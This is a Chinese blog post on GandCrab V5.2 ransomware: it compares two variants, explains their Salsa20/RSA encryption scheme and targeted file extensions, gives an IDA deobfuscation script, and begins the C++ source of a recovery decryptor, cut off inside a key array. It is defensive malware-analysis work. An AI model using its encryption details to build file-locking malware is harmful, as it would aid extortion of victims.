        <content type="html"><![CDATA[<center><font size = 7><b>GandCrab V5.2解密工具</b></font></center><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><blockquote><p>该修复报告主要针对GandCrab v5.2的两个版本进行修复的。在分析GandCrab V5.2时，偶然发现v5.2版本就目前我所发现的有两个不同的版本，修复工作也考虑到两者的差异，进行兼容两者都修复。</p></blockquote><h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><h2 id="两个同为V5-2版本的不同变种基本信息"><a href="#两个同为V5-2版本的不同变种基本信息" class="headerlink" title="两个同为V5.2版本的不同变种基本信息"></a>两个同为V5.2版本的不同变种基本信息</h2><table><thead><tr><th align="center">样本名称</th><th align="center">样本伪装图标</th><th align="center">MD5</th></tr></thead><tbody><tr><td align="center">GandCrab V5.2（1）</td><td align="center">浅色文件夹</td><td align="center">DE46B3B7F13F12769524755BB0A105FE</td></tr><tr><td align="center">GandCrab V5.2（2）</td><td align="center">Word文档</td><td align="center">445DD888ED51E331FDCF2FA89199CCA6</td></tr></tbody></table><p>GandCrab V5.2（1）和GandCrab V5.2（2）的图标如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrabV5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/image-20191204100427506.png" alt="image-20191204100427506"></p><p>我所发现的两个GandCrab V5.2，作者的加密RSA私钥一样，加密手法一样，大体上没有什么太大的区别，==但在一些行为上有些许的差别，这些差别也影响了修复的方式==。</p><h2 id="GandCrab-v5-2（1）与GandCrab-V5-2-2-的差别"><a href="#GandCrab-v5-2（1）与GandCrab-V5-2-2-的差别" class="headerlink" title="GandCrab v5.2（1）与GandCrab V5.2(2)的差别"></a>GandCrab v5.2（1）与GandCrab V5.2(2)的差别</h2><p><strong>注册表差异</strong></p><p>GandCrab V5.2(2）将随机生成的加密后缀保存到注册表：<code>HKLM(HKCU)\SOFTWARE\\ex_data\\data</code>中的<code>ext</code>中，并将加密的==密钥信息==（经过加密的用于加密本地RSA私钥的Salsa20的Key和IV，以及加密后的本地RSA私钥）保存在注册表：<code>HkLM(HKCU)\SOFTWARE\\keys_data\\data</code>中的<code>private</code>。</p><p>而GandCrab V5.2(1)==并没有将加密相关的信息写入注册表==，这将严重影响修复工具获取密钥信息（经过加密的用于加密本地RSA私钥的Salsa20的Key和IV，以及加密后的本地RSA私钥）的方法，导致==无法直接读取注册表获取密钥信息。==</p><p><strong>勒索说明差异</strong></p><p>从文本内容看勒索说明都是一样的，唯一的差别在于勒索说明的文件名不同，V5.2（1）为<code>MANUAL.txt</code>，V5.2（2）为<code>DECRYPT.txt</code>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrabV5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/image-20191204102908024.png" alt="image-20191204102908024"></p><p>GandCrab V5.2（2）瑞星的详细分析报告： <a href="http://it.rising.com.cn/fanglesuo/19523.html">http://it.rising.com.cn/fanglesuo/19523.html</a> </p><h1 id="加解密逻辑"><a href="#加解密逻辑" class="headerlink" title="加解密逻辑"></a>加解密逻辑</h1><h2 id="加密逻辑"><a href="#加密逻辑" class="headerlink" title="加密逻辑"></a>加密逻辑</h2><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrabV5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/GrandCrab.png" alt="GrandCrab"></p><p>首先通过硬编码解密出Salsa20的key和IV，然后通过Salsa20解密出作者的RSA-2048的公钥（RSA2048PublicKey），然后生成本地的RSA-2048密钥对，再用随机生成的Salsa20LocRSAPriv的Key和IV去加密本地RSA的私钥（LocRSAPrivateKey)，然后再用作者的RSA-2048公钥（RSA2048PublicKey）加密随机生成的Salsa20LocRSAPriv的Key和IV，并将加密后的本地RSA私钥（LocRSAPrivateKey）和加密后的Salsa20LocRSAPriv的Key和IV共同保存起来，V5.2（1）将这些密钥数据经过Base64加密保存在勒索说明中，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrabV5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/image-20191204104848604.png" alt="image-20191204104848604"></p><p>而V5.2（2）将这些密钥数据保存在注册表<code>HkLM(HKCU)\SOFTWARE\\keys_data\\data</code>中的<code>private</code>中。注册表中和解密后的勒索说明中的密钥数据如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrabV5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/Key.png" alt="Key"></p><p>然后在随机生成Salsa20File的Key和IV去加密文件，并用本地生成的LocRSAPublicKey去加密Salsa20File的Key和IV，并将其保存在文件末尾<code>0x21C</code>的位置，文件中的密钥数据布局，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.1/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/09_GandCrabV5.2%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/image-20191204105430575.png" alt="image-20191204105430575"></p><p>其中对加密文件时，有特殊的判断和不同的处理，作者给定了一个要加密的文件后缀表和一个不加密的文件后缀表。</p><ul><li>当文件在要加密文件后缀表中，则全文加密。</li><li>当文件不在加密文件后缀表中，也不在不加密的文件后缀表中，则只加密前1M的数据，不全文加密。</li><li>当文件小于1M，并且不在不加密文件后缀表中，只加密当前数据大小。</li></ul><p>加密后缀表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.1st.602.docb.xlm.xlsx.xlsm.xltx.xltm.xlsb.xla.xlam.xll.xlw.ppt.pot.pps.pptx.pptm.potx.potm.ppam.ppsx.ppsm.sldx.sldm.xps.xls.xlt._doc.dotm._docx.abw.act.adoc.aim.ans.apkg.apt.asc.asc.ascii.ase.aty.awp.awt.aww.bad.bbs.bdp.bdr.bean.bib.bib.bibtex.bml.bna.boc.brx.btd.bzabw.calca.charset.chart.chord.cnm.cod.crwl.cws.cyi.dca.dfti.dgs.diz.dne.dot.doc.docm.dotx.docx.docxml.docz.dox.dropbox.dsc.dvi.dwd.dx.dxb.dxp.eio.eit.emf.eml.emlx.emulecollection.epp.err.err.etf.etx.euc.fadein.template.faq.fbl.fcf.fdf.fdr.fds.fdt.fdx.fdxt.fft.fgs.flr.fodt.fountain.fpt.frt.fwd.fwdn.gmd.gpd.gpn.gsd.gthr.gv.hbk.hht.hs.hwp.hwp.hz.idx.iil.ipf.ipspot.jarvis.jis.jnp.joe.jp1.jrtf.jtd.kes.klg.klg.knt.kon.kwd.latex.lbt.lis.lnt.log.lp2.lst.lst.ltr.ltx.lue.luf.lwp.lxfml.lyt.lyx.man.mbox.mcw.md5.me.mell.mellel.min.mnt.msg.mw.mwd.mwp.nb.ndoc.nfo.ngloss.njx.note.notes.now.nwctxt.nwm.nwp.ocr.odif.odm.odo.odt.ofl.opeico.openbsd.ort.ott.p7s.pages.pages-tef.pdpcmd.pfx.pjt.plain.plantuml.pmo.prt.prt.psw.pu.pvj.pvm.pwd.pwdp.pwdpl.pwi.pwr.qdl.qpf.rad.readme.rft.ris.rpt.rst.rtd.rtf.rtfd.rtx.run.rvf.rzk.rzn.saf.safetext.sam.sam.save.scc.scm.scriv.scrivx.sct.scw.sdm.sdoc.sdw.se.session.sgm.sig.skcard.sla.sla.gz.smf.sms.ssa.story.strings.stw.sty.sublime-project.sublime-workspace.sxg.sxw.tab.tab.tdf.tdf.template.tex.text.textclipping.thp.tlb.tm.tmd.tmdx.tmv.tmvx.tpc.trelby.tvj.txt.u3i.unauth.unx.uof.uot.upd.utf8.utxt.vct.vnt.vw.wbk.webdoc.wn.wp.wp4.wp5.wp6.wp7.wpa.wpd.wpd.wpd.wpl.wps.wps.wpt.wpt.wpw.wri.wsd.wtt.wtx.xbdoc.xbplate.xdl.xdl.xwp.xwp.xwp.xy.xy3.xyp.xyw.zabw.zrtf.zw</span><br></pre></td></tr></table></figure><p>不加密后缀表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.ani.cab.cpl.cur.diagcab.diagpkg.dll.drv.lock.hlp.ldf.icl.icns.ico.ics.lnk.key.idx.mod.mpa.msc.msp.msstyles.msu.nomedia.ocx.prf.rom.rtp.scr.shs.spl.sys.theme.themepack.exe.bat.cmd.gandcrab.KRAB.CRAB.zerophage_i_like_your_pictures</span><br></pre></td></tr></table></figure><h2 id="解密逻辑"><a href="#解密逻辑" class="headerlink" title="解密逻辑"></a>解密逻辑</h2><p>由于GandCrab V5.2，根据我发现的两个版本的不同，进行兼容修复。</p><p>由于V5.2（2）将密钥数据写入了注册表，而V5.2（1）没有写注册表。也正因为V5.2（1）没有写注册表，所以在修复的时候需要输入一个被加密的目录来获取密钥。</p><p>在修复的时候，首先读取注册表密钥信息，当读取不到时，便会遍历当前目录去寻找勒索说明文件，并获取勒索说明中的密钥数据，并进行解密。</p><h1 id="附加：去花脚本"><a href="#附加：去花脚本" class="headerlink" title="附加：去花脚本"></a>附加：去花脚本</h1><p>GandCrab V5.2中有大量的花指令感染分析，其中每个函数入口点都有花指令，将导致IDA无法F5。我在分析时写了如下去花脚本，若需要再次分析GandCrab V5.2的样本时，可以使用。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">patch_junkcode</span>(<span class="params">addr</span>):</span></span><br><span class="line">    data = list(get_bytes(addr,<span class="number">28</span>))</span><br><span class="line">    <span class="keyword">if</span>((ord(data[<span class="number">0</span>]) == <span class="number">0xB9</span>) <span class="keyword">and</span> (ord(data[<span class="number">1</span>]) == <span class="number">0xD2</span>) <span class="keyword">and</span> (ord(data[<span class="number">2</span>]) == <span class="number">0xC3</span>) <span class="keyword">and</span> ord(data[<span class="number">3</span>]) == <span class="number">0x01</span> <span class="keyword">and</span> (ord(data[<span class="number">5</span>]) == <span class="number">0xE8</span>) <span class="keyword">and</span> (ord(data[<span class="number">6</span>]) == <span class="number">0x0B</span>)):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">28</span>):</span><br><span class="line">patch_byte(addr+i,<span class="number">0x90</span>)</span><br><span class="line">base = <span class="number">0x401000</span></span><br><span class="line">len = <span class="number">0x411000</span>-base</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len):</span><br><span class="line">patch_junkcode(base+i)</span><br><span class="line"></span><br><span class="line">AnalyzeArea(base, <span class="number">0x411000</span>) </span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Finished&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="解密程序源码："><a href="#解密程序源码：" class="headerlink" title="解密程序源码："></a>解密程序源码：</h1><blockquote><p>由于GandCrab作者公开了密钥，因此便可以对GandCrabV5.2的勒索文件进行修复。于是本人就写了修复解密工具，代码如下：</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Repair_GandCrabV5.2.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cryptlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincrypt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;salsa.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Shlwapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;String&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> CryptoPP;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;cryptlib.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;shlwapi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">BYTE AuRSAPubKey[] = &#123;</span><br><span class="line"><span class="number">0x07</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xA4</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x52</span>, <span class="number">0x53</span>,</span><br><span class="line">  <span class="number">0x41</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0xC2</span>, <span class="number">0xF3</span>, <span class="number">0x82</span>, <span class="number">0xA9</span>, <span class="number">0x7E</span>, <span class="number">0xEB</span>, <span class="number">0xC3</span>, <span class="number">0xF3</span>, <span class="number">0xFD</span>,</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0xF3</span>, <span class="number">0x6A</span>, <span class="number">0x48</span>, <span class="number">0x54</span>, <span class="number">0x04</span>, <span class="number">0x7B</span>, <span class="number">0xAD</span>, <span class="number">0xB5</span>, <span class="number">0x4C</span>,</span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x81</span>, <span class="number">0xB6</span>, <span class="number">0x51</span>, <span class="number">0x4C</span>, <span class="number">0x3A</span>, <span class="number">0x76</span>, <span class="number">0x02</span>,</span><br><span class="line">  <span class="number">0xC3</span>, <span class="number">0x45</span>, <span class="number">0x6A</span>, <span class="number">0x3A</span>, <span class="number">0xEA</span>, <span class="number">0x44</span>, <span class="number">0xAC</span>, <span class="number">0x00</span>, <span class="number">0xD8</span>, <span class="number">0xE4</span>,</span><br><span class="line">  <span class="number">0xAD</span>, <span class="number">0xBE</span>, <span class="number">0x42</span>, <span class="number">0xC5</span>, <span class="number">0xDC</span>, <span class="number">0xB6</span>, <span class="number">0xCD</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>, <span class="number">0xDF</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0xEE</span>, <span class="number">0xD1</span>, <span class="number">0x3B</span>, <span class="number">0xAC</span>, <span class="number">0xA2</span>, <span class="number">0xA5</span>, <span class="number">0x1F</span>, <span class="number">0xC1</span>, <span class="number">0xDE</span>,</span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x09</span>, <span class="number">0xD0</span>, <span class="number">0x81</span>, <span class="number">0x1D</span>, <span class="number">0xD0</span>, <span class="number">0xFA</span>, <span class="number">0x49</span>,</span><br><span class="line">  <span class="number">0xD1</span>, <span class="number">0x5D</span>, <span class="number">0x48</span>, <span class="number">0xB0</span>, <span class="number">0x71</span>, <span class="number">0x39</span>, <span class="number">0xD3</span>, <span class="number">0x8F</span>, <span class="number">0xB3</span>, <span class="number">0xA4</span>,</span><br><span class="line">  <span class="number">0x6D</span>, <span class="number">0xE8</span>, <span class="number">0x2F</span>, <span class="number">0xC8</span>, <span class="number">0x0C</span>, <span class="number">0x4B</span>, <span class="number">0xB4</span>, <span class="number">0xCF</span>, <span class="number">0xAF</span>, <span class="number">0x74</span>,</span><br><span class="line">  <span class="number">0x2F</span>, <span class="number">0x4C</span>, <span class="number">0xC2</span>, <span class="number">0xCC</span>, <span class="number">0x74</span>, <span class="number">0xC4</span>, <span class="number">0xCA</span>, <span class="number">0x1F</span>, <span class="number">0xFF</span>, <span class="number">0x1F</span>,</span><br><span class="line">  <span class="number">0xD8</span>, <span class="number">0xB0</span>, <span class="number">0xC2</span>, <span class="number">0x8D</span>, <span class="number">0xF0</span>, <span class="number">0xDF</span>, <span class="number">0x6A</span>, <span class="number">0x4F</span>, <span class="number">0xD9</span>, <span class="number">0xCF</span>,</span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0xED</span>, <span class="number">0xCE</span>, <span class="number">0x6F</span>, <span class="number">0x34</span>, <span class="number">0x28</span>, <span class="number">0x9D</span>, <span class="number">0x9E</span>, <span class="number">0x39</span>, <span class="number">0x0D</span>,</span><br><span class="line">  <span class="number">0x63</span>, <span class="number">0x4F</span>, <span class="number">0x1F</span>, <span class="number">0xB4</span>, <span class="number">0x06</span>, <span class="number">0x7F</span>, <span class="number">0xA3</span>, <span class="number">0xF9</span>, <span class="number">0x8D</span>, <span class="number">0x0B</span>,</span><br><span class="line">  <span class="number">0xD0</span>, <span class="number">0xAC</span>, 